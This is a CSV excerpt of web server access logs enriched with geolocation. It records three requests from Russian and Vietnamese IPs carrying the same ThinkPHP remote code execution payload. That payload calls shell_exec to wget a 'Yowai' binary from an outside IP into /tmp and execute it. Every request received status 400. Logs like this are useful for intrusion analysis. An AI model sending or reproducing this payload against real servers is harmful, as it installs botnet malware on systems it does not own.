ip_address,timestamp,request,status,size,referrer,user_agent,client,_merge,city,region,country,latitude,longitude
178.47.232.191,22/Jan/2019:04:54:22 +0330,GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1,400,166,-,Yowai/2.0,,left_only,Yekaterinburg,Sverdlovsk Oblast,RU,56.8519,60.6122
188.19.139.184,22/Jan/2019:06:06:53 +0330,GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1,400,166,-,Yowai/2.0,,left_only,Moscow,Moscow,RU,55.7522,37.6156
42.112.163.67,22/Jan/2019:06:36:36 +0330,GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1,400,166,-,Yowai/2.0,,left_only,Nha Trang,Khánh Hòa Province,VN,12.2451,109.1943
